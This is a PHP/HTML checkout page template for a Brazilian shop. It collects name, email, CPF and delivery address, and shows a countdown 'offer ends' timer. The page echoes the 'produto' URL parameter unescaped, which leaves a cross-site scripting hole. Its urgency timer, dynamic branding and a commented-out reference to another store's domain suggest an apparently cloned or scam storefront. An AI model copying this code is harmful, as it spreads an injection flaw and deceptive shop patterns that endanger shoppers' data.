        background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 70% 70%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 90% 20%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 15% 80%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), -webkit-linear-gradient(-245deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%);
        background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 30% 30%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 70% 70%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 90% 20%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-radial-gradient(circle at 15% 80%, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), linear-gradient(-25deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%);
        opacity: 1; }
      .jp-card.jp-card-identified .jp-card-front .jp-card-logo, .jp-card.jp-card-identified .jp-card-back .jp-card-logo {
        box-shadow: 0 0 0 2px rgba(255, 255, 255, 0.3); }
    .jp-card.jp-card-identified.no-radial-gradient .jp-card-front:before, .jp-card.jp-card-identified.no-radial-gradient .jp-card-back:before {
      background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), -webkit-linear-gradient(-245deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%);
      background-image: repeating-linear-gradient(45deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(135deg, rgba(255, 255, 255, 0.05) 1px, rgba(255, 255, 255, 0) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.03) 4px), repeating-linear-gradient(90deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), repeating-linear-gradient(210deg, rgba(255, 255, 255, 0) 1px, rgba(255, 255, 255, 0.03) 2px, rgba(255, 255, 255, 0.04) 3px, rgba(255, 255, 255, 0.05) 4px), linear-gradient(-25deg, rgba(255, 255, 255, 0) 50%, rgba(255, 255, 255, 0.2) 70%, rgba(255, 255, 255, 0) 90%); }
</style>


    <link rel="shortcut icon" href="arquivos/favicon.png?v=<?php echo time(); ?>">
    <link rel="icon" type="image/png" href="arquivos/favicon.png?v=<?php echo time(); ?>">
</head>

<body class="importadora-delirium checkout custom-checkout mercadopago centered-logo">


  <div class="inner-body">

    <header class="clearfix">
	<div class="container clearfix">
		<div class="inner-header -center">
			<div class="holder-logo pull-left hcenter flex default">
				<a href="" class="">
					<script>
					$.post("api/index.php",{api:"logo"},function(img){
					var i = img.replace("../","");
					document.getElementById("logoLoja").setAttribute("src", i);
					});
					</script>
					<div class="logo">
					<img src="" id="logoLoja" class="img-logo">
                    </div>
				</a>
			</div><!-- /.holder-logo -->

			<div class="flex-holder flex hcenter end">
				<div class="item-security pull-right black-70">
					<svg width="89" height="19" viewBox="0 0 89 19" fill="#898792" xmlns="http://www.w3.org/2000/svg">
<path fill-rule="evenodd" clip-rule="evenodd" d="M9.75 14.1875V8.5C9.75 8.05127 9.38623 7.6875 8.9375 7.6875L2.4375 7.6875C1.98877 7.6875 1.625 8.05127 1.625 8.5L1.625 14.1875C1.625 14.6362 1.98877 15 2.4375 15H8.9375C9.38623 15 9.75 14.6362 9.75 14.1875ZM11.375 8.5V14.1875C11.375 15.5337 10.2837 16.625 8.9375 16.625H2.4375C1.09131 16.625 -5.8844e-08 15.5337 0 14.1875L2.48609e-07 8.5C3.07453e-07 7.15381 1.09131 6.0625 2.4375 6.0625L8.9375 6.0625C10.2837 6.0625 11.375 7.15381 11.375 8.5Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M5.6875 3.625C4.79004 3.625 4.0625 4.35254 4.0625 5.25V6.875H2.4375V5.25C2.4375 3.45507 3.89257 2 5.6875 2C7.48243 2 8.9375 3.45507 8.9375 5.25V6.875H7.3125V5.25C7.3125 4.35254 6.58496 3.625 5.6875 3.625Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M6.5 10.125L6.5 12.5625H4.875L4.875 10.125H6.5Z"></path>
<path d="M23.136 0.11C23.73 0.11 24.236 0.205333 24.654 0.396C25.072 0.586667 25.391 0.861666 25.611 1.221C25.831 1.58033 25.941 2.01667 25.941 2.53C25.941 3.04333 25.831 3.47967 25.611 3.839C25.391 4.19833 25.072 4.47333 24.654 4.664C24.236 4.85467 23.73 4.95 23.136 4.95H21.695V7.37H19.803V0.11H23.136ZM22.839 3.531C23.235 3.531 23.532 3.45033 23.73 3.289C23.9353 3.12033 24.038 2.86733 24.038 2.53C24.038 2.19267 23.9353 1.94333 23.73 1.782C23.532 1.61333 23.235 1.529 22.839 1.529H21.695V3.531H22.839Z"></path>
<path d="M33.0094 7.37H31.0624L30.5564 5.731H28.0704L27.5534 7.37H25.6504L28.2024 0.11H30.4684L33.0094 7.37ZM28.4224 4.444H30.2044L29.3134 1.507L28.4224 4.444Z"></path>
<path d="M36.5882 7.48C35.9429 7.48 35.3672 7.337 34.8612 7.051C34.3626 6.765 33.9739 6.34333 33.6952 5.786C33.4166 5.22867 33.2772 4.55033 33.2772 3.751C33.2772 2.96633 33.4239 2.29533 33.7172 1.738C34.0106 1.18067 34.4286 0.751667 34.9712 0.451C35.5212 0.150333 36.1666 0 36.9072 0C37.7286 0 38.3922 0.150333 38.8982 0.451C39.4042 0.744333 39.7966 1.21367 40.0752 1.859L38.3262 2.552C38.2309 2.178 38.0622 1.90667 37.8202 1.738C37.5782 1.56933 37.2776 1.485 36.9182 1.485C36.5589 1.485 36.2509 1.573 35.9942 1.749C35.7376 1.91767 35.5432 2.17067 35.4112 2.508C35.2792 2.838 35.2132 3.24867 35.2132 3.74C35.2132 4.25333 35.2792 4.68233 35.4112 5.027C35.5506 5.37167 35.7522 5.62833 36.0162 5.797C36.2876 5.95833 36.6212 6.039 37.0172 6.039C37.2299 6.039 37.4242 6.01333 37.6002 5.962C37.7762 5.91067 37.9302 5.83733 38.0622 5.742C38.1942 5.63933 38.2969 5.51467 38.3702 5.368C38.4436 5.214 38.4802 5.03433 38.4802 4.829V4.719H36.8192V3.454H40.0862V7.37H38.7992L38.6562 5.665L38.9642 5.929C38.8102 6.42767 38.5316 6.81267 38.1282 7.084C37.7322 7.348 37.2189 7.48 36.5882 7.48Z"></path>
<path d="M48.1344 7.37H46.1874L45.6814 5.731H43.1954L42.6784 7.37H40.7754L43.3274 0.11H45.5934L48.1344 7.37ZM43.5474 4.444H45.3294L44.4384 1.507L43.5474 4.444Z"></path>
<path d="M57.3828 0.11V7.37H55.7108V4.037L55.7658 1.804H55.7438L53.9508 7.37H52.4218L50.6288 1.804H50.6068L50.6618 4.037V7.37H48.9788V0.11H51.6738L52.8178 3.806L53.2248 5.346H53.2468L53.6648 3.817L54.7978 0.11H57.3828Z"></path>
<path d="M58.9905 7.37V0.11H64.6445V1.573H60.8825V3.047H63.8745V4.422H60.8825V5.907H64.7875V7.37H58.9905Z"></path>
<path d="M72.4749 0.11V7.37H70.3739L68.1189 3.443L67.5689 2.365H67.5579L67.6019 3.707V7.37H65.9299V0.11H68.0309L70.2859 4.037L70.8359 5.115H70.8469L70.8029 3.773V0.11H72.4749Z"></path>
<path d="M80.1883 0.11V1.573H77.8233V7.37H75.9313V1.573H73.5553V0.11H80.1883Z"></path>
<path d="M84.225 0C84.9583 0 85.589 0.150333 86.117 0.451C86.6523 0.744333 87.063 1.16967 87.349 1.727C87.635 2.28433 87.778 2.95533 87.778 3.74C87.778 4.52467 87.635 5.19567 87.349 5.753C87.063 6.31033 86.6523 6.73933 86.117 7.04C85.589 7.33333 84.9583 7.48 84.225 7.48C83.4917 7.48 82.8573 7.33333 82.322 7.04C81.7867 6.73933 81.376 6.31033 81.09 5.753C80.804 5.19567 80.661 4.52467 80.661 3.74C80.661 2.95533 80.804 2.28433 81.09 1.727C81.376 1.16967 81.7867 0.744333 82.322 0.451C82.8573 0.150333 83.4917 0 84.225 0ZM84.225 1.485C83.873 1.485 83.576 1.56933 83.334 1.738C83.092 1.90667 82.9087 2.15967 82.784 2.497C82.6593 2.827 82.597 3.24133 82.597 3.74C82.597 4.23133 82.6593 4.64567 82.784 4.983C82.9087 5.32033 83.092 5.57333 83.334 5.742C83.576 5.91067 83.873 5.995 84.225 5.995C84.577 5.995 84.8703 5.91067 85.105 5.742C85.347 5.57333 85.5303 5.32033 85.655 4.983C85.7797 4.64567 85.842 4.23133 85.842 3.74C85.842 3.24133 85.7797 2.827 85.655 2.497C85.5303 2.15967 85.347 1.90667 85.105 1.738C84.8703 1.56933 84.577 1.485 84.225 1.485Z"></path>
<path d="M21.03 18.37V13.84C21.03 13.7067 21.03 13.57 21.03 13.43C21.0367 13.2833 21.0433 13.13 21.05 12.97C20.8233 13.19 20.5633 13.38 20.27 13.54C19.9833 13.6933 19.6867 13.8033 19.38 13.87L19.18 12.94C19.32 12.92 19.4833 12.8733 19.67 12.8C19.8567 12.7267 20.05 12.6333 20.25 12.52C20.45 12.4067 20.6333 12.2867 20.8 12.16C20.9667 12.0267 21.0967 11.8967 21.19 11.77H22.09V18.37H21.03Z"></path>
<path d="M26.1634 18.47C25.3701 18.47 24.7468 18.1833 24.2934 17.61C23.8468 17.03 23.6234 16.1833 23.6234 15.07C23.6234 13.9567 23.8468 13.1133 24.2934 12.54C24.7468 11.96 25.3701 11.67 26.1634 11.67C26.9634 11.67 27.5868 11.96 28.0334 12.54C28.4868 13.1133 28.7134 13.9567 28.7134 15.07C28.7134 16.1833 28.4868 17.03 28.0334 17.61C27.5868 18.1833 26.9634 18.47 26.1634 18.47ZM26.1634 17.56C26.4834 17.56 26.7501 17.47 26.9634 17.29C27.1834 17.1033 27.3468 16.8267 27.4534 16.46C27.5668 16.0867 27.6234 15.6233 27.6234 15.07C27.6234 14.5167 27.5668 14.0567 27.4534 13.69C27.3468 13.3167 27.1834 13.04 26.9634 12.86C26.7501 12.6733 26.4834 12.58 26.1634 12.58C25.8434 12.58 25.5734 12.6733 25.3534 12.86C25.1401 13.04 24.9801 13.3167 24.8734 13.69C24.7668 14.0567 24.7134 14.5167 24.7134 15.07C24.7134 15.6233 24.7668 16.0867 24.8734 16.46C24.9801 16.8267 25.1401 17.1033 25.3534 17.29C25.5734 17.47 25.8434 17.56 26.1634 17.56Z"></path>
<path d="M32.4427 18.47C31.6494 18.47 31.0261 18.1833 30.5727 17.61C30.1261 17.03 29.9027 16.1833 29.9027 15.07C29.9027 13.9567 30.1261 13.1133 30.5727 12.54C31.0261 11.96 31.6494 11.67 32.4427 11.67C33.2427 11.67 33.8661 11.96 34.3127 12.54C34.7661 13.1133 34.9927 13.9567 34.9927 15.07C34.9927 16.1833 34.7661 17.03 34.3127 17.61C33.8661 18.1833 33.2427 18.47 32.4427 18.47ZM32.4427 17.56C32.7627 17.56 33.0294 17.47 33.2427 17.29C33.4627 17.1033 33.6261 16.8267 33.7327 16.46C33.8461 16.0867 33.9027 15.6233 33.9027 15.07C33.9027 14.5167 33.8461 14.0567 33.7327 13.69C33.6261 13.3167 33.4627 13.04 33.2427 12.86C33.0294 12.6733 32.7627 12.58 32.4427 12.58C32.1227 12.58 31.8527 12.6733 31.6327 12.86C31.4194 13.04 31.2594 13.3167 31.1527 13.69C31.0461 14.0567 30.9927 14.5167 30.9927 15.07C30.9927 15.6233 31.0461 16.0867 31.1527 16.46C31.2594 16.8267 31.4194 17.1033 31.6327 17.29C31.8527 17.47 32.1227 17.56 32.4427 17.56Z"></path>
<path d="M37.362 18.37L41.682 11.77H42.602L38.292 18.37H37.362ZM37.622 11.67C37.962 11.67 38.2554 11.7467 38.502 11.9C38.7554 12.0533 38.9487 12.2667 39.082 12.54C39.222 12.8133 39.292 13.1367 39.292 13.51C39.292 13.8767 39.222 14.2 39.082 14.48C38.9487 14.7533 38.7554 14.9667 38.502 15.12C38.2554 15.2733 37.962 15.35 37.622 15.35C37.2887 15.35 36.9954 15.2733 36.742 15.12C36.4887 14.9667 36.292 14.7533 36.152 14.48C36.0187 14.2 35.952 13.8767 35.952 13.51C35.952 13.1367 36.0187 12.8133 36.152 12.54C36.292 12.2667 36.4887 12.0533 36.742 11.9C36.9954 11.7467 37.2887 11.67 37.622 11.67ZM37.622 12.45C37.4554 12.45 37.312 12.4933 37.192 12.58C37.072 12.66 36.982 12.78 36.922 12.94C36.862 13.0933 36.832 13.2833 36.832 13.51C36.832 13.73 36.862 13.92 36.922 14.08C36.982 14.24 37.072 14.36 37.192 14.44C37.312 14.52 37.4554 14.56 37.622 14.56C37.7954 14.56 37.942 14.52 38.062 14.44C38.182 14.36 38.272 14.24 38.332 14.08C38.392 13.92 38.422 13.73 38.422 13.51C38.422 13.2833 38.392 13.0933 38.332 12.94C38.272 12.78 38.182 12.66 38.062 12.58C37.942 12.4933 37.7954 12.45 37.622 12.45ZM42.342 14.79C42.682 14.79 42.9754 14.8667 43.222 15.02C43.4754 15.1733 43.6687 15.39 43.802 15.67C43.942 15.9433 44.012 16.2633 44.012 16.63C44.012 17.0033 43.942 17.3267 43.802 17.6C43.6687 17.8733 43.4754 18.0867 43.222 18.24C42.9754 18.3933 42.682 18.47 42.342 18.47C42.0087 18.47 41.7154 18.3933 41.462 18.24C41.2087 18.0867 41.012 17.8733 40.872 17.6C40.7387 17.3267 40.672 17.0033 40.672 16.63C40.672 16.2633 40.7387 15.9433 40.872 15.67C41.012 15.39 41.2087 15.1733 41.462 15.02C41.7154 14.8667 42.0087 14.79 42.342 14.79ZM42.342 15.58C42.1754 15.58 42.032 15.62 41.912 15.7C41.792 15.78 41.702 15.9 41.642 16.06C41.582 16.2133 41.552 16.4033 41.552 16.63C41.552 16.85 41.582 17.04 41.642 17.2C41.702 17.36 41.792 17.4833 41.912 17.57C42.032 17.65 42.1754 17.69 42.342 17.69C42.5154 17.69 42.662 17.65 42.782 17.57C42.902 17.4833 42.992 17.36 43.052 17.2C43.112 17.04 43.142 16.85 43.142 16.63C43.142 16.41 43.112 16.22 43.052 16.06C42.992 15.9 42.902 15.78 42.782 15.7C42.662 15.62 42.5154 15.58 42.342 15.58Z"></path>
<path d="M50.8628 11.67C51.4561 11.67 51.9695 11.7833 52.4028 12.01C52.8361 12.23 53.2028 12.5567 53.5028 12.99L52.7828 13.68C52.5295 13.2933 52.2428 13.0167 51.9228 12.85C51.6095 12.6767 51.2361 12.59 50.8028 12.59C50.4828 12.59 50.2195 12.6333 50.0128 12.72C49.8061 12.8067 49.6528 12.9233 49.5528 13.07C49.4595 13.21 49.4128 13.37 49.4128 13.55C49.4128 13.7567 49.4828 13.9367 49.6228 14.09C49.7695 14.2433 50.0395 14.3633 50.4328 14.45L51.7728 14.75C52.4128 14.89 52.8661 15.1033 53.1328 15.39C53.3995 15.6767 53.5328 16.04 53.5328 16.48C53.5328 16.8867 53.4228 17.24 53.2028 17.54C52.9828 17.84 52.6761 18.07 52.2828 18.23C51.8961 18.39 51.4395 18.47 50.9128 18.47C50.4461 18.47 50.0261 18.41 49.6528 18.29C49.2795 18.17 48.9528 18.0067 48.6728 17.8C48.3928 17.5933 48.1628 17.3567 47.9828 17.09L48.7228 16.35C48.8628 16.5833 49.0395 16.7933 49.2528 16.98C49.4661 17.16 49.7128 17.3 49.9928 17.4C50.2795 17.5 50.5961 17.55 50.9428 17.55C51.2495 17.55 51.5128 17.5133 51.7328 17.44C51.9595 17.3667 52.1295 17.26 52.2428 17.12C52.3628 16.9733 52.4228 16.8 52.4228 16.6C52.4228 16.4067 52.3561 16.2367 52.2228 16.09C52.0961 15.9433 51.8561 15.83 51.5028 15.75L50.0528 15.42C49.6528 15.3333 49.3228 15.21 49.0628 15.05C48.8028 14.89 48.6095 14.6967 48.4828 14.47C48.3561 14.2367 48.2928 13.9767 48.2928 13.69C48.2928 13.3167 48.3928 12.98 48.5928 12.68C48.7995 12.3733 49.0961 12.13 49.4828 11.95C49.8695 11.7633 50.3295 11.67 50.8628 11.67Z"></path>
<path d="M55.0288 18.37V11.77H59.8088V12.69H56.0988V14.59H58.9988V15.49H56.0988V17.45H59.9488V18.37H55.0288Z"></path>
<path d="M63.9491 18.47C63.3291 18.47 62.7924 18.3333 62.3391 18.06C61.8857 17.7867 61.5324 17.4 61.2791 16.9C61.0257 16.3933 60.8991 15.7833 60.8991 15.07C60.8991 14.37 61.0291 13.7667 61.2891 13.26C61.5557 12.7533 61.9291 12.3633 62.4091 12.09C62.8957 11.81 63.4524 11.67 64.0791 11.67C64.7657 11.67 65.3191 11.7967 65.7391 12.05C66.1657 12.3033 66.5057 12.6967 66.7591 13.23L65.7691 13.7C65.6424 13.3333 65.4324 13.06 65.1391 12.88C64.8524 12.6933 64.5024 12.6 64.0891 12.6C63.6757 12.6 63.3124 12.6967 62.9991 12.89C62.6924 13.0833 62.4524 13.3667 62.2791 13.74C62.1057 14.1067 62.0191 14.55 62.0191 15.07C62.0191 15.5967 62.0957 16.0467 62.2491 16.42C62.4024 16.7867 62.6324 17.0667 62.9391 17.26C63.2524 17.4533 63.6357 17.55 64.0891 17.55C64.3357 17.55 64.5657 17.52 64.7791 17.46C64.9924 17.3933 65.1791 17.3 65.3391 17.18C65.4991 17.0533 65.6224 16.8967 65.7091 16.71C65.8024 16.5167 65.8491 16.29 65.8491 16.03V15.84H63.9291V14.97H66.7991V18.37H65.9991L65.9391 17.04L66.1391 17.14C65.9791 17.56 65.7124 17.8867 65.3391 18.12C64.9724 18.3533 64.5091 18.47 63.9491 18.47Z"></path>
<path d="M73.7654 11.77V15.84C73.7654 16.7133 73.5354 17.37 73.0754 17.81C72.6154 18.25 71.9454 18.47 71.0654 18.47C70.1987 18.47 69.5321 18.25 69.0654 17.81C68.6054 17.37 68.3754 16.7133 68.3754 15.84V11.77H69.4454V15.71C69.4454 16.33 69.5787 16.79 69.8454 17.09C70.112 17.39 70.5187 17.54 71.0654 17.54C71.6187 17.54 72.0287 17.39 72.2954 17.09C72.5621 16.79 72.6954 16.33 72.6954 15.71V11.77H73.7654Z"></path>
<path d="M78.2852 11.77C78.9919 11.77 79.5519 11.9467 79.9652 12.3C80.3852 12.6533 80.5952 13.13 80.5952 13.73C80.5952 14.35 80.3852 14.83 79.9652 15.17C79.5519 15.5033 78.9919 15.67 78.2852 15.67L78.1852 15.73H76.6552V18.37H75.5952V11.77H78.2852ZM78.2052 14.84C78.6386 14.84 78.9586 14.7533 79.1652 14.58C79.3786 14.4 79.4852 14.1267 79.4852 13.76C79.4852 13.4 79.3786 13.13 79.1652 12.95C78.9586 12.77 78.6386 12.68 78.2052 12.68H76.6552V14.84H78.2052ZM78.8352 15.06L80.9852 18.37H79.7552L77.9152 15.48L78.8352 15.06Z"></path>
<path d="M84.9954 11.67C85.6354 11.67 86.1887 11.8067 86.6554 12.08C87.122 12.3533 87.482 12.7433 87.7354 13.25C87.9887 13.7567 88.1154 14.3633 88.1154 15.07C88.1154 15.7767 87.9887 16.3833 87.7354 16.89C87.482 17.3967 87.122 17.7867 86.6554 18.06C86.1887 18.3333 85.6354 18.47 84.9954 18.47C84.3621 18.47 83.812 18.3333 83.3454 18.06C82.8787 17.7867 82.5187 17.3967 82.2654 16.89C82.0121 16.3833 81.8854 15.7767 81.8854 15.07C81.8854 14.3633 82.0121 13.7567 82.2654 13.25C82.5187 12.7433 82.8787 12.3533 83.3454 12.08C83.812 11.8067 84.3621 11.67 84.9954 11.67ZM84.9954 12.6C84.5821 12.6 84.2254 12.6967 83.9254 12.89C83.6321 13.0833 83.4054 13.3633 83.2454 13.73C83.0854 14.0967 83.0054 14.5433 83.0054 15.07C83.0054 15.59 83.0854 16.0367 83.2454 16.41C83.4054 16.7767 83.6321 17.0567 83.9254 17.25C84.2254 17.4433 84.5821 17.54 84.9954 17.54C85.4154 17.54 85.7721 17.4433 86.0654 17.25C86.3654 17.0567 86.5954 16.7767 86.7554 16.41C86.9154 16.0367 86.9954 15.59 86.9954 15.07C86.9954 14.5433 86.9154 14.0967 86.7554 13.73C86.5954 13.3633 86.3654 13.0833 86.0654 12.89C85.7721 12.6967 85.4154 12.6 84.9954 12.6Z"></path>
</svg>

				</div>

									<a href="" class="item-cart pull-right black-70 ml30 mr10">
						<div class="holder-icon">
							<svg width="32" height="32" viewBox="0 0 32 32" fill="#898792" xmlns="http://www.w3.org/2000/svg">
<path d="M20 25C20 25.5523 19.5523 26 19 26C18.4477 26 18 25.5523 18 25C18 24.4477 18.4477 24 19 24C19.5523 24 20 24.4477 20 25Z"></path>
<path d="M14 25C14 25.5523 13.5523 26 13 26C12.4477 26 12 25.5523 12 25C12 24.4477 12.4477 24 13 24C13.5523 24 14 24.4477 14 25Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M7.26541 7C8.75836 7 10.0241 8.09779 10.2353 9.57574L11.7446 20.1414C11.815 20.6341 12.2369 21 12.7346 21L22 21V23H12.7346C11.2416 23 9.97588 21.9022 9.76474 20.4243L8.25536 9.85858C8.18498 9.36593 7.76306 9 7.26541 9L6 9L6 7L7.26541 7Z"></path>
<path fill-rule="evenodd" clip-rule="evenodd" d="M12 9H21.9384C23.8902 9 25.3222 10.8342 24.8489 12.7276L23.8489 16.7276C23.515 18.0631 22.315 19 20.9384 19H11V17H20.9384C21.3973 17 21.7973 16.6877 21.9086 16.2425L22.9086 12.2425C23.0664 11.6114 22.589 11 21.9384 11H12V9Z"></path>
</svg>


							<div class="cart-qtd flex all-center">
								1
							</div><!-- /.cart-qtd -->
						</div><!-- /.holder-icon -->
					</a>

							</div>
		</div><!-- /.inner-header -->

		<nav>

			<div class="icon-arrow">
				<i class="fa fa-angle-left"></i>
			</div>
		</nav>

		<a href="javascript:" class="st-pusher">
		</a>

	</div><!-- /.container -->
</header>
    <div class="content clearfix">

	<div class="holder-countdown" style="background:<?php echo $cor;?> !important;">
    <div class="container">
        <div class="countdown-timer" style="display:<?php echo $ofertaTime;?>;color:white !important;">
            <i class="fa fa-clock-o"></i>
            Oferta termina em <span class="bold" data-countdown="2022-06-18 21:08:04" data-minutes="9">00:08:24</span>
        </div>

		<div class="countdown-timer" style="display:<?php echo $ofertaTexto;?>; font-weight:bold; color:white !important;">
            <?php echo $nomeproduto;?>
        </div>


    </div>
</div>
	<div class="container clearfix">
		<div class="recomm-cart checkout"></div><!-- /.recomm -->
	</div>

	<div class="container container-pjax clearfix">
		<div class="container-promocode active-address text-center">

	<div class="holder-cols-checkout">

		<ul class="steps-checkout mb20 clearfix hide ">
			<li class="checkout-step enabled ">
				<div class="connect"></div>
				<div class="holder-icon">1</div>
				<div class="info">Informações pessoais</div>
				<a href="#" data-url="checkout.php?produto=<?php echo $_GET["produto"];?>" class="link-abs link-box-checkout" data-target=".box-checkout"></a>
			</li>

							<li class="checkout-step active enabled">
					<div class="connect"></div>
					<div class="holder-icon">2</div>
					<div class="info">Entrega</div>
					<a href="#" data-url="" class="link-abs active" data-target=".box-checkout"></a>
				</li>

			<li class="checkout-step disabled">
				<div class="connect"></div>
				<div class="holder-icon">
					3
				</div>
				<div class="info">Pagamento</div>
				<a href="" data-url="" class="link-abs " data-target=".box-checkout"></a>
			</li>
		</ul><!-- /.steps -->

		<div class="clearfix col-checkout-holder">

			<div class="col-checkout col-1">
				<div class="box-checkout box-customer link-box-checkout" data-url="checkout.php?editar=<?php echo md5(time());?>" data-next=".box-addresses">

    <div class="box-title">
        <div class="holder-number">1</div>
        <div class="title ctx-title f-h2 bold">
            Dados pessoais
                            <i class="icon-complete ml5 fa fa-check green"></i>
                    </div>
        <div class="desc mb25">
            Solicitamos apenas as informações essenciais para você fazer sua compra.
        </div>
    </div>

            <div class="infos black-80 f14">
            <div class="f16 medium mb10" id="imprimir_nome"></div>
            <div class="mb5" id="imprimir_email"></div>
            <div>CPF:&nbsp;<span class="cpf" id="imprimir_cpf"></span></div>
            <div class="edit">
                <span class="icon icon-pencil"></span>
                <span class="tooltip2">
    <div class="tt-content-holder" style="width: auto">
        <div class="tt-content bold text-center">
		<div class="tt-line">Editar</div></div>
    </div>
</span></div>
        </div>


    <div class="overlay-spinner overlay-spinner-box">
        <div class="spinner spinner-grey"></div>
    </div>
</div>

									<div class="box-checkout box-addresses active" data-url="address" data-target=".box-addresses">
	<div class="box-title">
		<div class="holder-number">2</div><!-- /.holder-number -->
		<div class="title f-h2 ctx-title bold">
			Entrega
					</div><!-- /.f-h2 -->
		<div class="desc mb5 block">
			Cadastre ou selecione um endereço
		</div>
	</div><!-- /.box-title -->


			<div class="box-content">

		<!--	<form id="form-checkout-shipment" action="" data-url="https://brpanini.com/sections/zipcode.php" class="form-horizontal clearfix text-left form-address " method="POST">
		-->
			<form id="form-checkout-shipment" action="" data-url="https://viacep.com.br/ws/00000-000/json/" class="form-horizontal clearfix text-left form-address " method="POST">

		<div class="clearfix group-first mt5">
		<div class="form-group w-50">
			<label for="zipcode" class="label-control block">
				CEP
			</label>

			<div class="holder-input holder-input-zipcode invalid">
				<input type="tel" name="zipcode" id="zipcode" class="input input-validate required zipcode minlength" minlength="9" autofocus="" value="" maxlength="9">
				<span class="spinner spinner-grey spinner-form"></span>
			</div><!-- /.holder-input -->
			<div id="zipcode_errors" class="error-block" data-error-relatedfields="" style="display: none;"></div><!-- /.error-block -->
		</div><!-- /.form-group w-50 -->

		<div class="form-group w-50">
			<div class="city-infos hide black-60 f13">
				<span class="city-name"></span>

				<span class="city-uf"></span>
			</div>
		</div><!-- /.form-group w-50 -->

	</div><!-- /.clearfix -->

	<div class="group-form hide">
		<div class="form-group w-100">
			<label for="street" class="label-control block">Endereço</label>
			<div class="holder-input invalid">
				<input type="street" name="street" id="street" class="input input-validate required street minlength" minlength="5" value="">
			</div><!-- /.holder-input -->
			<div id="street_errors" class="error-block"></div><!-- /.error-block -->
		</div><!-- /.form-group w-50 -->

		<div class="form-group w-38 keep-size -padding-right">
			<label for="number" class="label-control block">Número</label>
			<div class="holder-input invalid">
				<input type="text" maxlength="9" name="number" id="number" class="input input-validate required" value="">
			</div><!-- /.holder-input -->
			<div id="number_errors" class="error-block"></div><!-- /.error-block -->
		</div><!-- /.form-group w-50 -->

		<div class="form-group w-62 keep-size -padding-left">
			<label for="neighborhood" class="label-control block">Bairro</label>
